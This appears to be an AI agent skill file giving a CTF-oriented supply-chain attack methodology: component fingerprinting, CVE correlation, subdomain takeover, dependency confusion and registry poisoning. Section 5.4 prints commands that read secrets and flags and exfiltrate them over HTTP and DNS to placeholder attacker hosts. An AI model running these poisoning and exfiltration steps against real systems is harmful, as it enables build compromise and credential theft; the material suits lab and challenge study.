---
name: supply-chain-audit
description: "Supply chain security audit and attack. Use when fingerprinting reveals known frameworks such as WordPress/Jenkins/Struts/Django, or when dependency manifest files such as /package.json /composer.json /package-lock.json /Gemfile are found. Also applies when CI/CD build systems (Jenkins/GitLab CI/OpsFlow), private registries (Harbor/Nexus/Verdaccio) are discovered, or when the challenge involves supply chain poisoning / dependency confusion scenarios. Framework and component versions map directly to CVEs — this is the first step of an exploit chain and the most easily overlooked attack surface"
zh-signals: "审计供应链组件与构建环境风险，覆盖 CVE 关联、子域名接管与依赖投毒。信号:供应链安全,组件漏洞,子域名接管,dependency confusion,CI/CD投毒。"
when-to-use: >-
  Use when fingerprinting reveals known frameworks or dependency manifests, or when the target involves CI/CD build systems, private registries, or supply-chain poisoning scenarios.
metadata:
  tags: "supply-chain,component,cdn,third-party,js,npm,subdomain-takeover,supply-chain-security,component-security,dependency-confusion,supply-chain-poisoning,poisoning,build,pipeline,cicd,registry,harbor,nexus"
  category: "exploit"
---

# Supply Chain Security Audit Methodology

A supply chain attack does not require breaking the target's own code — it only requires one of the components the target depends on to be vulnerable or poisoned.

## ⛔ Further Reading (Must Read)

- Subdomain takeover, CDN/SRI security, third-party script risks, retired components, risk assessment matrix → [references/supply-chain-deep.md](references/supply-chain-deep.md)
- **Active supply chain attacks**: Dependency Confusion, registry poisoning, CI/CD injection, build environment secret theft → [references/supply-chain-attack.md](references/supply-chain-attack.md)

## Phase 1: Component Discovery

### Frontend JS Library Identification
```bash
katana -u http://target -silent -d 2
```
Extract from HTML/JS: `<script src="...jquery-3.6.0.min.js">` → jQuery 3.6.0

### Backend Technology Stack
```bash
curl -sI http://target | grep -i "Server\|X-Powered-By\|X-AspNet"
httpx -u http://target -tech-detect -silent
```
Response headers: `X-Powered-By: Express` | `Server: Apache/2.4.41` | `X-AspNet-Version`

### Subdomain → Third-Party Service Mapping
```bash
subfinder -d target.com -silent
ksubdomain -d target.com
```
Check CNAME: `status.target.com → statuspage.io` | `docs.target.com → gitbook.io`

## Phase 2: Known Vulnerability Correlation

Component + version → CVE matching:
- jQuery < 3.5.0 → XSS | lodash < 4.17.21 → command injection
- Log4j 2.0-2.14.1 → RCE | Apache 2.4.49-2.4.50 → path traversal RCE

```bash
nuclei -u http://target -severity critical,high
```

## Phase 3: Subdomain Takeover
CNAME points to a decommissioned service → attacker registers it → controls the subdomain content
→ Detection methods and the list of claimable services → [references/supply-chain-deep.md](references/supply-chain-deep.md)

## Phase 4: CDN and External Resources
CDN references without SRI = compromise the CDN and the target is compromised
→ Detailed assessment methods → [references/supply-chain-deep.md](references/supply-chain-deep.md)

## Phase 5: Active Supply Chain Attacks (Poisoning)

When the target runs a build system and uses private package or image registries, poisoning can be used to obtain the flag/secrets inside the build environment.

### 5.1 Recon the Build Environment
```bash
# Discover private registries
curl -s http://registry:5000/v2/_catalog              # Docker
curl -s http://nexus:8081/service/rest/v1/search       # Nexus
curl -s http://verdaccio:4873/-/all | jq 'keys[]'     # npm

# Extract internal package names from build logs/config
grep -r 'npm install\|pip install\|docker pull' /build/ /ci/
```

### 5.2 Dependency Confusion
Upload a same-named higher-version package to a public/writable registry → the build system pulls the attacker's package → install hook executes malicious code

### 5.3 Image Tag Overwriting
Push a malicious image with the same tag → the next build pulls the poisoned base image

### 5.4 Flag Extraction from the Build Environment
```bash
env | grep -i flag
find / -name "flag*" 2>/dev/null
cat /run/secrets/*
# Exfiltrate over HTTP/DNS
curl http://attacker/exfil -d "$(cat /flag*)"
nslookup $(cat /flag* | base64 -w0).attacker.com
```

→ Full attack steps and payloads → [references/supply-chain-attack.md](references/supply-chain-attack.md)

## Notes
- The core is **completeness** — missing a single component may mean missing a critical risk
- Subdomain takeover is the easiest direction to produce results
